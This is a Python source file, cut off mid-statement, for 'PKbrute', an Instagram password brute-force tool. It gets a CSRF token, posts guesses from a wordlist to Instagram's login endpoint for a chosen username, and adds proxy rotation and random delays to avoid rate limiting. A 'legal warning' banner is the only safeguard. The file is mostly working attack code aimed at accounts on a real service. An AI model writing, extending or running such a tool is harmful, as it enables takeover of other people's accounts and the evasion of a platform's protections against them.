#!/usr/bin/env python3
"""
PKbrute - Instagram Brute Force Tool (Enhanced)
Developed by Pankaj
For authorized security testing only
"""

import requests
import sys
import time
from urllib.parse import urljoin, urlparse
from colorama import init, Fore, Style
import os
import re
import random
import string
import json

# Initialize colorama
init(autoreset=True)

# Branding
BANNER = f"""
{Fore.CYAN}{'='*60}
{Fore.RED}██████╗ ██╗  ██╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
{Fore.RED}██╔══██╗██║ ██╔╝    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
{Fore.RED}██████╔╝█████╔╝     ██████╔╝██████╔╝██║   ██║   ██║   █████╗
{Fore.RED}██╔═══╝ ██╔═██╗     ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝
{Fore.RED}██║     ██║  ██╗    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
{Fore.RED}╚═╝     ╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
{Fore.GREEN}              Instagram Brute Force Tool
{Fore.YELLOW}                   Developed by Pankaj | PKbrute IG v2.0
{Fore.CYAN}{'='*60}
{Fore.RED}[!] LEGAL WARNING: Only use on systems you own or have permission!
{Style.RESET_ALL}
"""

class PKbruteInstagram:
    def __init__(self):
        self.session = requests.Session()
        # Instagram-specific headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'X-IG-App-ID': '936619743392459',  # Instagram app ID
            'X-ASBD-ID': '198387',
            'X-IG-WWW-Claim': '0',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/'
        })
        
    def print_banner(self):
        print(BANNER)
        
    def get_csrf_token(self):
        """Get CSRF token from Instagram"""
        try:
            response = self.session.get('https://www.instagram.com/', timeout=10)
            csrf_token = None
            
            # Extract CSRF token from cookies
            for cookie in self.session.cookies:
                if cookie.name == 'csrftoken':
                    csrf_token = cookie.value
                    break
            
            return csrf_token
        except Exception as e:
            print(f"{Fore.RED}[!] Error getting CSRF token: {e}{Style.RESET_ALL}")
            return None
    
    def get_encrypted_password(self, password):
        """Simulate Instagram's password encryption (simplified)"""
        # Instagram uses a complex encryption, this is a simplified version
        # In a real scenario, you'd need to reverse engineer their encryption
        return password
    
    def test_instagram_login(self, username, password):
        """Test Instagram login credentials"""
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            return False
        
        # Update headers with CSRF token
        self.session.headers.update({
            'X-CSRFToken': csrf_token,
            'X-Instagram-AJAX': '1',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        
        # Prepare login data
        login_data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',  # Simplified format
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'stopDeletion': 'false',
            'trustedDevice': 'false'
        }
        
        try:
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                timeout=10,
                allow_redirects=False
            )
            
            # Check response
            if response.status_code == 200:
                try:
                    response_json = response.json()
                    
                    # Check for success indicators
                    if response_json.get('authenticated', False):
                        return True
                    
                    # Check for specific error messages
                    if 'checkpoint_required' in response_json:
                        print(f"{Fore.YELLOW}[!] Checkpoint required - account may be locked{Style.RESET_ALL}")
                        return False
                    
                    # Check for two-factor authentication
                    if 'two_factor_required' in response_json:
                        print(f"{Fore.YELLOW}[!] Two-factor authentication enabled{Style.RESET_ALL}")
                        return False
                    
                    # Check for specific error messages
                    if 'invalid_user' in response_json.get('message', '').lower():
                        return False
                    
                    if 'incorrect_password' in response_json.get('message', '').lower():
                        return False
                    
                    # Check for other error indicators
                    if response_json.get('status') == 'fail':
                        return False
                        
                except json.JSONDecodeError:
                    # If we can't parse JSON, check for redirect
                    if 'accounts/edit' in response.text:
                        return True
                    
            # Check for redirect to login page (indicates failure)
            if response.status_code == 302 and 'accounts/login' in response.headers.get('Location', ''):
                return False
                
            return False
            
        except Exception as e:
            return False
    
    def random_delay(self, min_delay=0.5, max_delay=2.0):
        """Add random delay to avoid rate limiting"""
        delay = random.uniform(min_delay, max_delay)
        time.sleep(delay)
    
    def run_attack(self):
        """Main attack function"""
        self.print_banner()
        
        # Get username
        print(f"\n{Fore.YELLOW}[?] Enter the Instagram username to test{Style.RESET_ALL}")
        username = input(f"{Fore.GREEN}Username: {Style.RESET_ALL}").strip()
        
        # Get wordlist
        print(f"\n{Fore.YELLOW}[?] Enter the FULL path to password wordlist{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Example: /home/kali/wordlist.txt{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Or use Kali's wordlist: /usr/share/wordlists/rockyou.txt{Style.RESET_ALL}")
        wordlist_path = input(f"{Fore.GREEN}Wordlist path: {Style.RESET_ALL}").strip()
        
        # Check wordlist
        if not os.path.exists(wordlist_path):
            print(f"{Fore.RED}[!] Wordlist not found!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[?] Create a test wordlist? (yes/no): {Style.RESET_ALL}", end='')
            if input().lower() == 'yes':
                wordlist_path = self.create_test_wordlist()
            else:
                return
        
        # Load passwords
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except:
            print(f"{Fore.RED}[!] Cannot read wordlist{Style.RESET_ALL}")
            return
        
        # Ask for proxy settings
        print(f"\n{Fore.YELLOW}[?] Do you want to use proxies? (yes/no): {Style.RESET_ALL}", end='')
        use_proxies = input().lower() == 'yes'
        
        if use_proxies:
            proxy_file = input(f"{Fore.CYAN}[?] Enter proxy file path: {Style.RESET_ALL}")
            if os.path.exists(proxy_file):
                with open(proxy_file, 'r') as f:
                    proxies = [line.strip() for line in f if line.strip()]
            else:
                print(f"{Fore.RED}[!] Proxy file not found, continuing without proxies{Style.RESET_ALL}")
                proxies = []
        else:
            proxies = []
        
        # Ask for delay settings
        print(f"\n{Fore.YELLOW}[?] Set delay between attempts (in seconds, default: 1.0): {Style.RESET_ALL}", end='')
        try:
            delay_setting = float(input())
        except:
            delay_setting = 1.0
        
        # Confirm attack
        print(f"\n{Fore.RED}{'='*50}")
        print(f"TARGET: Instagram - {username}")
        print(f"PASSWORDS TO TRY: {len(passwords)}")
        print(f"DELAY: {delay_setting} seconds")
        print(f"PROXIES: {'Enabled' if proxies else 'Disabled'}")
        print(f"{'='*50}{Style.RESET_ALL}")
        
        confirm = input(f"{Fore.RED}[!] Start attack? (yes/no): {Style.RESET_ALL}")
        if confirm.lower()
